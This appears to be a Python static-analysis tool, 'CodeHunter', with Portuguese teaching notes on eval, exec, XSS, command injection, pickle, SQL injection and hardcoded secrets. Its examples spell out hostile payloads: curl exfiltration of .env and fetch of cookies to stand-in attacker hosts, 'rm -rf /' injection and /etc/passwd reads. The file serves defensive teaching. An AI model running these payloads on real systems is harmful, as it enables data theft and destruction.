import re
from typing import Dict, Any, List

class CodeHunter:
    """Analisador Estático de Código (SAST Simples) com Orientações Educacionais"""

    # Pattern definitions with educational context
    VULNERABILITY_DATABASE = {
        'eval': {
            'pattern': r'eval\(',
            'category': 'Dangerous Functions',
            'name': 'Uso de eval()',
            'severity': 'CRITICAL',
            'deduction': 25,
            'why': 'eval() executa código fornecido como string, permitindo que atacantes executem comandos arbitrários no servidor/navegador.',
            'how_exploited': 'Exemplo: eval(userInput) onde userInput = "require(\'fs\').readFileSync(\'/etc/passwd\')" pode ler arquivos do sistema.',
            'where': 'Comum em: JavaScript dinâmico, parsers de expressões matemáticas',
            'how_to_fix': 'SOLUÇÃO: NUNCA use eval(). Para JSON use JSON.parse(), para math use bibliotecas como math.js, para lógica use função específica.',
            'poc': {
                'vulnerable': '// ❌ CÓDIGO VULNERÁVEL\nconst userInput = req.query.expression;\nconst result = eval(userInput);  // PERIGO!',
                'exploit': '// ⚔️ ATAQUE SIMULADO\n// URL: /calc?expression=require("child_process").execSync("cat /etc/passwd")\n// Resultado: Atacante lê arquivo de senhas do servidor',
                'fixed': '// ✅ CÓDIGO CORRIGIDO\nconst math = require("mathjs");\nconst result = math.evaluate(userInput, {/* whitelist safe */});'
            }
        },
        'exec': {
            'pattern': r'exec\(',
            'category': 'Dangerous Functions',
            'name': 'Uso de exec()',
            'severity': 'CRITICAL',
            'deduction': 25,
            'why': 'Similar a eval(), exec() executa código Python/JS arbitrário passado como string.',
            'how_exploited': 'Atacante pode injetar: exec("__import__(\'os\').system(\'rm -rf /\')") deletaria tudo no Linux.',
            'where': 'Comum em: Scripts de automação, parsers de configuração',
            'how_to_fix': 'SOLUÇÃO: Refatore para usar funções/módulos nativos. Se REALMENTE necessário, valide inputs com whitelist rigorosa.',
            'poc': {
                'vulnerable': '# ❌ CÓDIGO VULNERÁVEL\nuser_code = request.form["code"]\nexec(user_code)  # PERIGO!',
                'exploit': '# ⚔️ ATAQUE SIMULADO\n# Input: __import__("os").system("curl http://attacker.com?data=$(cat .env)")\n# Resultado: Envia variáveis de ambiente (.env) para servidor atacante',
                'fixed': '# ✅ CÓDIGO CORRIGIDO\n# Não use exec(). Refatore para lógica específica:\nif action == "calculate":\n    result = safe_calculate(params)'
            }
        },
        'innerHTML': {
            'pattern': r'innerHTML\s*=',
            'category': 'XSS (Cross-Site Scripting)',
            'name': 'Possível DOM XSS',
            'severity': 'HIGH',
            'deduction': 15,
            'why': 'innerHTML insere HTML diretamente no DOM sem sanitização, permitindo injeção de scripts maliciosos.',
            'how_exploited': 'Se innerHTML = userInput onde userInput = "<img src=x onerror=alert(document.cookie)>", scripts roubam cookies.',
            'where': 'Comum em: Renderização de conteúdo dinâmico, chat apps, comentários',
            'how_to_fix': 'SOLUÇÃO: Use textContent para texto puro, ou sanitize com DOMPurify antes de innerHTML.',
            'poc': {
                'vulnerable': '// ❌ CÓDIGO VULNERÁVEL\nconst userName = new URLSearchParams(location.search).get("name");\ndocument.getElementById("greeting").innerHTML = "Olá, " + userName;',
                'exploit': '// ⚔️ ATAQUE SIMULADO\n// URL: /page?name=<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">\n// Resultado: Cookie de sessão enviado para atacante, conta roubada',
                'fixed': '// ✅ CÓDIGO CORRIGIDO\ndocument.getElementById("greeting").textContent = "Olá, " + userName;\n// OU com sanitização:\nimport DOMPurify from "dompurify";\nelement.innerHTML = DOMPurify.sanitize(userInput);'
            }
        },
        'os.system': {
            'pattern': r'os\.system\(',
            'category': 'Command Injection',
            'name': 'Chamada de Sistema sem Sanitização',
            'severity': 'CRITICAL',
            'deduction': 25,
            'why': 'os.system() executa comandos shell diretamente, permitindo injeção de comandos pelo atacante.',
            'how_exploited': 'os.system("ping " + userInput) com userInput = "google.com; rm -rf /" executa dois comandos.',
            'where': 'Comum em: Scripts de manutenção, automação de servidores',
            'how_to_fix': 'SOLUÇÃO: Use subprocess.run() com shell=False e lista de argumentos, ou shlex.quote() para escape.'
        },
        'pickle.loads': {
            'pattern': r'pickle\.loads\(',
            'category': 'Insecure Deserialization',
            'name': 'Deserialização Insegura',
            'severity': 'CRITICAL',
            'deduction': 25,
            'why': 'pickle.loads() pode executar código arbitrário ao deserializar objetos maliciosos.',
            'how_exploited': 'Atacante envia pickle malicioso que executa código durante unpickling (__reduce__ exploit).',
            'where': 'Comum em: Cache, sessões, comunicação entre processos',
            'how_to_fix': 'SOLUÇÃO: Use JSON para dados simples. Se precisar de objetos, use msgpack, protobuf, ou assine pickles com HMAC.'
        },
        'aws_key': {
            'pattern': r'(?i)aws_access_key_id\s*=\s*[\'"][A-Z0-9]{20}[\'"]',
            'category': 'Hardcoded Secrets',
            'name': 'AWS Access Key Exposta',
            'severity': 'CRITICAL',
            'deduction': 30,
            'why': 'Chaves AWS no código permitem que qualquer um acesse seus recursos na nuvem.',
            'how_exploited': 'Atacante usa a chave para criar instâncias EC2, acessar S3, gerar custos enormes.',
            'where': 'Comum em: Scripts de deploy, configs esquecidas, commits públicos',
            'how_to_fix': 'SOLUÇÃO: Use variáveis de ambiente (.env), AWS Systems Manager, ou Secrets Manager. REVOGUE a chave exposta IMEDIATAMENTE.'
        },
        'stripe_key': {
            'pattern': r'(?i)sk_live_[0-9a-zA-Z]{24}',
            'category': 'Hardcoded Secrets',
            'name': 'Stripe Secret Key Exposta',
            'severity': 'CRITICAL',
            'deduction': 30,
            'why': 'Chave secreta do Stripe permite criar cobranças, acessar dados de clientes.',
            'how_exploited': 'Atacante cria reembolsos, rouba dados de cartões, ou cria cobranças fraudulentas.',
            'where': 'Comum em: Backend de e-commerce',
            'how_to_fix': 'SOLUÇÃO: Armazene em .env, revogue a chave no dashboard Stripe e gere uma nova.'
        },
        'api_key': {
            'pattern': r'(?i)api_key\s*=\s*[\'"][a-zA-Z0-9_]{20,}[\'"]',
            'category': 'Hardcoded Secrets',
            'name': 'API Key Genérica Exposta',
            'severity': 'HIGH',
            'deduction': 20,
            'why': 'Permite acesso não autorizado a serviços pagos ou privados.',
            'how_exploited': 'Atacante usa a key para consumir quota, acessar dados, ou gerar custos.',
            'where': 'Comum em: Integrações com APIs (SendGrid, Twilio, etc)',
            'how_to_fix': 'SOLUÇÃO: Use variáveis de ambiente, rotacione a chave comprometida.'
        },
        'password': {
            'pattern': r'(?i)password\s*=\s*[\'"][\w@#$%^&*]{3,}[\'"]',
            'category': 'Hardcoded Secrets',
            'name': 'Senha Hardcoded',
            'severity': 'HIGH',
            'deduction': 20,
            'why': 'Senhas no código ficam acessíveis a qualquer um com acesso ao repositório.',
            'how_exploited': 'Atacante acessa banco de dados, admin panels, ou serviços protegidos.',
            'where': 'Comum em: Testes, protótipos que foram pra produção',
            'how_to_fix': 'SOLUÇÃO: Use .env ou gerenciadores de segredos (Vault, AWS Secrets).'
        },
        'sql_format': {
            'pattern': r'execute\([\'"]SELECT.*%s',
            'category': 'SQL Injection',
            'name': 'SQL Injection via Formatação',
            'severity': 'CRITICAL',
            'deduction': 25,
            'why': 'Concatenar strings em SQL permite que atacantes modifiquem a query.',
            'how_exploited': 'userInput = "\' OR \'1\'=\'1" bypassa autenticação ou deleta dados.',
            'where': 'Comum em: Logins, buscas, filtros',
            'how_to_fix': 'SOLUÇÃO: Use prepared statements ou ORMs (SQLAlchemy, Django ORM).'
        }
    }

    def analyze(self, code: str) -> Dict[str, Any]:
        report = {
            'score': 100,
            'issues': [],
            'lines_analyzed': len(code.split('\n'))
        }

        lines = code.split('\n')

        for i, line in enumerate(lines):
            # Skip comments
            if line.strip().startswith('#') or line.strip().startswith('//'):
                continue

            # Check each vulnerability pattern
            for vuln_id, vuln in self.VULNERABILITY_DATABASE.items():
                if re.search(vuln['pattern'], line):
                    report['score'] -= vuln['deduction']
                    report['issues'].append({
                        'line': i + 1,
                        'content': line.strip()[:150],  # Show more context
                        'category': vuln['category'],
                        'name': vuln['name'],
                        'description': vuln['why'],
                        'how_exploited': vuln['how_exploited'],
                        'where_common': vuln['where'],
                        'fix': vuln['how_to_fix'],
                        'severity': vuln['severity'],
                        'poc': vuln.get('poc')  # Include PoC if available
                    })

        report['score'] = max(0, report['score'])
        return report
